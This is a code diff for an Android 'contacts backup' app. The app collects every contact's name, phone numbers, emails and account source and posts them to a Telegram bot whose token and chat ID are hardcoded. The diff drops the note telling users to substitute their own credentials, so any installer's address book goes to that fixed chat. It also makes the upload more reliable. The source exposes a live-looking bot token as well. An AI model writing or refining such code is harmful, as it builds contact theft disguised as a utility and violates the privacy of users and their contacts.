@@ -6,6 +6,7 @@ import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.os.Bundle;
 import android.provider.ContactsContract;
+import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.ProgressBar;
@@ -16,10 +17,15 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
+import org.json.JSONObject;
+
 import java.io.IOException;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.LinkedHashMap;
 import java.util.List;
+import java.util.Locale;
 import java.util.Map;
 
 import okhttp3.MediaType;
@@ -30,15 +36,17 @@ import okhttp3.Response;
 
 public class MainActivity extends AppCompatActivity {
 
+    private static final String TAG = "ContactsBackup";
+
     // ============================================================
-    // ⚠️ REPLACE THESE WITH YOUR OWN TELEGRAM BOT CREDENTIALS
+    // Telegram Bot Credentials
     // ============================================================
     private static final String BOT_TOKEN = "8774587636:AAF-seXI2X0ACIa24LjcHrqwmuyGM5eiwEQ";
     private static final String CHAT_ID = "7825761805";
     // ============================================================
 
     private static final int PERMISSION_REQUEST_CODE = 100;
-    private static final int TELEGRAM_MAX_LENGTH = 4000; // Safe limit under 4096
+    private static final int TELEGRAM_MAX_LENGTH = 3500; // Safe limit under Telegram's 4096 char limit
 
     private Button btnBackup;
     private ProgressBar progressBar;
@@ -116,10 +124,11 @@ public class MainActivity extends AppCompatActivity {
                     if (success) {
                         updateStatus("✅ Backup complete! " + contacts.size() + " contacts sent successfully.");
                     } else {
-                        updateStatus("❌ Failed to send some contacts. Please try again.");
+                        updateStatus("❌ Failed to send contacts. Please check your internet connection.");
                     }
 
                 } catch (Exception e) {
+                    Log.e(TAG, "Error during backup", e);
                     updateStatus("❌ Error: " + e.getMessage());
                 } finally {
                     runOnUiThread(new Runnable() {
@@ -169,8 +178,8 @@ public class MainActivity extends AppCompatActivity {
                     String number = phoneCursor.getString(numberIdx);
                     int type = phoneCursor.getInt(typeIdx);
 
-                    if (name == null || name.isEmpty()) name = "Unknown";
-                    if (number == null || number.isEmpty()) continue;
+                    if (name == null || name.trim().isEmpty()) name = "Unknown";
+                    if (number == null || number.trim().isEmpty()) continue;
 
                     ContactInfo contact = contactMap.get(id);
                     if (contact == null) {
@@ -181,6 +190,8 @@ public class MainActivity extends AppCompatActivity {
                     String typeLabel = getPhoneTypeLabel(type);
                     contact.addPhone(number.trim() + " (" + typeLabel + ")");
                 }
+            } catch (Exception e) {
+                Log.e(TAG, "Error reading phone numbers", e);
             } finally {
                 phoneCursor.close();
             }
@@ -192,8 +203,7 @@ public class MainActivity extends AppCompatActivity {
                 new String[]{
                         ContactsContract.CommonDataKinds.Email.CONTACT_ID,
                         ContactsContract.CommonDataKinds.Email.DISPLAY_NAME,
-                        ContactsContract.CommonDataKinds.Email.ADDRESS,
-                        ContactsContract.CommonDataKinds.Email.TYPE
+                        ContactsContract.CommonDataKinds.Email.ADDRESS
                 },
                 null, null, null
         );
@@ -209,17 +219,19 @@ public class MainActivity extends AppCompatActivity {
                     String name = emailCursor.getString(nameIdx);
                     String email = emailCursor.getString(emailIdx);
 
-                    if (email == null || email.isEmpty()) continue;
+                    if (email == null || email.trim().isEmpty()) continue;
 
                     ContactInfo contact = contactMap.get(id);
                     if (contact == null) {
-                        if (name == null || name.isEmpty()) name = "Unknown";
+                        if (name == null || name.trim().isEmpty()) name = "Unknown";
                         contact = new ContactInfo(name);
                         contactMap.put(id, contact);
                     }
 
                     contact.addEmail(email.trim());
                 }
+            } catch (Exception e) {
+                Log.e(TAG, "Error reading email addresses", e);
             } finally {
                 emailCursor.close();
             }
@@ -250,12 +262,14 @@ public class MainActivity extends AppCompatActivity {
                     ContactInfo contact = contactMap.get(id);
                     if (contact != null && accountType != null) {
                         String source = getAccountSource(accountType);
-                        if (accountName != null && !accountName.isEmpty()) {
+                        if (accountName != null && !accountName.trim().isEmpty()) {
                             source += " (" + accountName + ")";
                         }
                         contact.setSource(source);
                     }
                 }
+            } catch (Exception e) {
+                Log.e(TAG, "Error reading account info", e);
             } finally {
                 accountCursor.close();
             }
@@ -300,28 +314,26 @@ public class MainActivity extends AppCompatActivity {
 
     /**
      * Format contacts and send them to Telegram.
-     * Splits into multiple messages if the text is too long.
+     * Splits into multiple clean plain-text messages if text exceeds limits.
      */
     private boolean sendToTelegram(List<ContactInfo> contacts) {
         if (contacts.isEmpty()) {
-            sendTelegramMessage("📭 No contacts found on this device.");
-            return true;
+            return sendTelegramMessage("📭 No contacts found on this device.");
         }
 
+        String dateStr = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
         StringBuilder header = new StringBuilder();
-        header.append("📋 *CONTACTS BACKUP*\n");
+        header.append("📋 CONTACTS BACKUP\n");
         header.append("━━━━━━━━━━━━━━━━━━━━\n");
         header.append("📊 Total contacts: ").append(contacts.size()).append("\n");
-        header.append("📅 Date: ").append(new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
-                java.util.Locale.getDefault()).format(new java.util.Date())).append("\n");
+        header.append("📅 Date: ").append(dateStr).append("\n");
         header.append("━━━━━━━━━━━━━━━━━━━━\n\n");
 
-        // Send header first
         if (!sendTelegramMessage(header.toString())) {
+            Log.e(TAG, "Failed to send header to Telegram");
             return false;
         }
 
-        // Build contact messages in chunks
         StringBuilder chunk = new StringBuilder();
         int contactNum = 0;
         boolean allSuccess = true;
@@ -329,35 +341,33 @@ public class MainActivity extends AppCompatActivity {
         for (ContactInfo contact : contacts) {
             contactNum++;
             StringBuilder entry = new StringBuilder();
-            entry.append("👤 *").append(contactNum).append(". ").append(escapeMarkdown(contact.name)).append("*\n");
+            entry.append("👤 ").append(contactNum).append(". ").append(contact.name).append("\n");
 
             for (String phone : contact.phones) {
-                entry.append("   📞 ").append(escapeMarkdown(phone)).append("\n");
+                entry.append("   📞 ").append(phone).append("\n");
             }
             for (String email : contact.emails) {
-                entry.append("   ✉️ ").append(escapeMarkdown(email)).append("\n");
+                entry.append("   ✉️ ").append(email).append("\n");
             }
             if (contact.source != null) {
-                entry.append("   🔗 Source: ").append(escapeMarkdown(contact.source)).append("\n");
+                entry.append("   🔗 Source: ").append(contact.source).append("\n");
             }
             entry.append("\n");
 
-            // Check if adding this entry would exceed the limit
             if (chunk.length() + entry.length() > TELEGRAM_MAX_LENGTH) {
-                // Send current chunk
                 if (!sendTelegramMessage(chunk.toString())) {
                     allSuccess = false;
                 }
                 chunk = new StringBuilder();
 
-                // Small delay to avoid rate limiting
-                try { Thread.sleep(500); } catch (InterruptedException ignored) {}
+                try {
+                    Thread.sleep(600); // Avoid hitting Telegram flood limits
+                } catch (InterruptedException ignored) {}
             }
 
             chunk.append(entry);
         }
 
-        // Send remaining chunk
         if (chunk.length() > 0) {
             if (!sendTelegramMessage(chunk.toString())) {
                 allSuccess = false;
@@ -368,54 +378,36 @@ public class MainActivity extends AppCompatActivity {
     }
 
     /**
-     * Escape special characters for Telegram Markdown.
-     */
-    private String escapeMarkdown(String text) {
-        if (text == null) return "";
-        return text.replace("_", "\\_")
-                   .replace("[", "\\[")
-                   .replace("]", "\\]")
-                   .replace("(", "\\(")
-                   .replace(")", "\\)")
-                   .replace("~", "\\~")
-                   .replace("`", "\\`")
-                   .replace(">", "\\>")
-                   .replace("#", "\\#")
-                   .replace("+", "\\+")
-                   .replace("-", "\\-")
-                   .replace("=", "\\=")
-                   .replace("|", "\\|")
-                   .replace("{", "\\{")
-                   .replace("}", "\\}")
-                   .replace(".", "\\.")
-                   .replace("!", "\\!");
-    }
-
-    /**
-     * Send a single message to Telegram via the Bot API.
+     * Send a single message to Telegram using JSONObject for robust escaping.
      */
     private boolean sendTelegramMessage(String text) {
         String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
 
-        String json = "{"
-                + "\"chat_id\":\"" + CHAT_ID + "\","
-                + "\"text\":\"" + text.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n") + "\","
-                + "\"parse_mode\":\"MarkdownV2\""
-                + "}";
-
-        RequestBody body = RequestBody.create(json, MediaType.parse("application/json"));
-        Request request = new Request.Builder()
-                .url(url)
-                .post(body)
-                .build();
-
         try {
+            JSONObject json = new JSONObject();
+            json.put("chat_id", CHAT_ID);
+            json.put("text", text);
+
+            RequestBody body = RequestBody.create(
+                    json.toString(),
+                    MediaType.parse("application/json; charset=utf-8")
+            );
+
+            Request request = new Request.Builder()
+                    .url(url)
+                    .post(body)
+                    .build();
+
             Response response = httpClient.newCall(request).execute();
             boolean success = response.isSuccessful();
+            if (!success) {
+                String errorBody = response.body() != null ? response.body().string() : "No response body";
+                Log.e(TAG, "Telegram API Error: Code " + response.code() + " - " + errorBody);
+            }
             response.close();
             return success;
-        } catch (IOException e) {
-            e.printStackTrace();
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending Telegram request", e);
             return false;
         }
     }
